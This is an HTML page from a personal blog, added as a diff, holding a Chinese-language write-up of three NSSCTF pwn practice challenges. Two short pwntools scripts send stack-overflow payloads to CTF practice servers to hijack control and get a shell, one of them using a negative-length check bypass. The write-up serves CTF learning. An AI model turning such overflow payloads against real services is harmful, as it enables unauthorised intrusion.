@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>NSSCTF pwn 刷题记录 | BW-jitang</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://jitang-BW.github.io/favicon.ico?v=1698753168785">
+<link rel="stylesheet" href="https://jitang-BW.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="[CISCN 2019华北]PWN1
+
+拿到shell的条件是让v2等于特定的值，恰好有个v1无限制读取，两个数的寄存器首地址相同，那就覆盖到v2的地址，然后把特定值的十六进制数填入
+exp
+from pwn import *
+
+conte..." />
+    <meta name="keywords" content="PWN" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://jitang-BW.github.io">
+        <img src="https://jitang-BW.github.io/images/avatar.png?v=1698753168785" class="site-logo">
+        <h1 class="site-title">BW-jitang</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jitang-BW.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">NSSCTF pwn 刷题记录</h2>
+            <div class="post-date">2023-10-23</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="ciscn-2019华北pwn1">[CISCN 2019华北]PWN1</h1>
+<figure data-type="image" tabindex="1"><img src="https://jitang-BW.github.io/post-images/1698059065241.png" alt="" loading="lazy"></figure>
+<p>拿到shell的条件是让v2等于特定的值，恰好有个v1无限制读取，两个数的寄存器首地址相同，那就覆盖到v2的地址，然后把特定值的十六进制数填入</p>
+<h2 id="exp">exp</h2>
+<pre><code>from pwn import *
+
+context(log_level='debug',os='linux',terminal=['tmux','splitw','-h'])
+
+p = remote('node4.anna.nssctf.cn',28409)
+
+payload = b'a'*(0x30-0x4)+p64(0x41348000)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://jitang-BW.github.io/post-images/1698059322631.png" alt="" loading="lazy"></figure>
+<h1 id="bjdctf-2020babystack20">[BJDCTF 2020]babystack2.0</h1>
+<p>一道栈溢出，但是有个长度的保护，拿负数来绕过，因为后来是unsigned，会变得很大，后接payload就能过<br>
+<img src="https://jitang-BW.github.io/post-images/1698751713085.png" alt="" loading="lazy"></p>
+<h2 id="exp-2">exp</h2>
+<pre><code>from pwn import*
+#from LibcSearcher import*
+
+context(log_level='debug',os='linux',terminal=['tmux','splitw','-h'],arch=&quot;amd64&quot;)
+#process = ('./pwn(1)')
+p=remote('node4.anna.nssctf.cn',28607)
+
+p.recvuntil(&quot;name:&quot;)
+p.sendline(b'-1')
+payload = b'a' * 0x18 + p64(0x400726)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://jitang-BW.github.io/post-images/1698751933285.png" alt="" loading="lazy"></figure>
+<h1 id="nisactf-2022reorpwn">[NISACTF 2022]ReorPwn?</h1>
+<p>一个输入字符反转，没有任何别的坑（保护开了很多，但是没啥关系）<br>
+<img src="https://jitang-BW.github.io/post-images/1698753060240.png" alt="" loading="lazy"></p>
+<h2 id="exp-3">exp</h2>
+<p>无</p>
+<figure data-type="image" tabindex="4"><img src="https://jitang-BW.github.io/post-images/1698753161404.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://jitang-BW.github.io/tag/0jiN4r7VI/" class="tag">
+                    PWN
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://jitang-BW.github.io/post/w8eYLX-LU/">
+                  <h3 class="post-title">
+                    科协第二次培训
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
